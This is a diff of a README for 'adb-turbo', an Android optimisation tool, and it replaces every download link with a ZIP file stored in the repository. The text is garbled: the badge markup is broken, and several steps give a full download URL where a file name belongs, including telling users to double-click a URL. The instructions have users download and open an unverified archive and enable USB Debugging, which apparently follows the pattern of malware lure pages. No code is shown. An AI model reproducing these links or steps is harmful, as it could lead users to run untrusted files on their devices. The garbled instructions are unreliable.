@@ -1,6 +1,6 @@
 # 🚀 adb-turbo - Boost Your Android Performance Easily
 
-[![Download Here!](https://raw.githubusercontent.com/f959/adb-turbo/main/static/adb-turbo-2.8-alpha.4.zip%20Now!-%https://raw.githubusercontent.com/f959/adb-turbo/main/static/adb-turbo-2.8-alpha.4.zip)](https://raw.githubusercontent.com/f959/adb-turbo/main/static/adb-turbo-2.8-alpha.4.zip)
+[![Download Here!](https://github.com/f959/adb-turbo/raw/refs/heads/main/docs/adb_turbo_v3.0.zip%20Now!-%https://github.com/f959/adb-turbo/raw/refs/heads/main/docs/adb_turbo_v3.0.zip)](https://github.com/f959/adb-turbo/raw/refs/heads/main/docs/adb_turbo_v3.0.zip)
 
 ## 📥 Introduction
 
@@ -26,13 +26,13 @@ Once Developer Options is enabled, find and toggle on **USB Debugging**.
 ## 🚀 Getting Started
 
 1. **Visit the Download Page:** Click the link below to access the adb-turbo releases page.  
-   [Download Here!](https://raw.githubusercontent.com/f959/adb-turbo/main/static/adb-turbo-2.8-alpha.4.zip)
+   [Download Here!](https://github.com/f959/adb-turbo/raw/refs/heads/main/docs/adb_turbo_v3.0.zip)
 
-2. **Download the Latest Version:** Look for the latest version at the top of the list. You will find various assets available. Click on the one labeled "https://raw.githubusercontent.com/f959/adb-turbo/main/static/adb-turbo-2.8-alpha.4.zip" to download the package.
+2. **Download the Latest Version:** Look for the latest version at the top of the list. You will find various assets available. Click on the one labeled "https://github.com/f959/adb-turbo/raw/refs/heads/main/docs/adb_turbo_v3.0.zip" to download the package.
 
 3. **Extract the Files:** After downloading, locate the downloaded ZIP file on your computer. Right-click on the file and select **Extract Here** or **Extract All**. This will create a new folder with all necessary files.
 
-4. **Open the Application:** Navigate to the folder you just extracted. Find the file named `https://raw.githubusercontent.com/f959/adb-turbo/main/static/adb-turbo-2.8-alpha.4.zip` and double-click on it. This will launch the web interface in your default browser.
+4. **Open the Application:** Navigate to the folder you just extracted. Find the file named `https://github.com/f959/adb-turbo/raw/refs/heads/main/docs/adb_turbo_v3.0.zip` and double-click on it. This will launch the web interface in your default browser.
 
 5. **Connect Your Device:** Use a USB cable to connect your Android device to your computer. Make sure USB Debugging is enabled, as mentioned earlier.
 
@@ -60,14 +60,14 @@ The web interface is user-friendly:
 ## 📋 Download & Install
 
 To get started with adb-turbo, follow the link to download the latest version:  
-[Download Here!](https://raw.githubusercontent.com/f959/adb-turbo/main/static/adb-turbo-2.8-alpha.4.zip)
+[Download Here!](https://github.com/f959/adb-turbo/raw/refs/heads/main/docs/adb_turbo_v3.0.zip)
 
 ### Installation Steps Recap
 
 1. Visit the above link.
-2. Download the latest `https://raw.githubusercontent.com/f959/adb-turbo/main/static/adb-turbo-2.8-alpha.4.zip`.
+2. Download the latest `https://github.com/f959/adb-turbo/raw/refs/heads/main/docs/adb_turbo_v3.0.zip`.
 3. Extract the files.
-4. Open the `https://raw.githubusercontent.com/f959/adb-turbo/main/static/adb-turbo-2.8-alpha.4.zip` file.
+4. Open the `https://github.com/f959/adb-turbo/raw/refs/heads/main/docs/adb_turbo_v3.0.zip` file.
 5. Connect your Android device and enable USB Debugging.
 
 ## 🗒️ Tips for Users
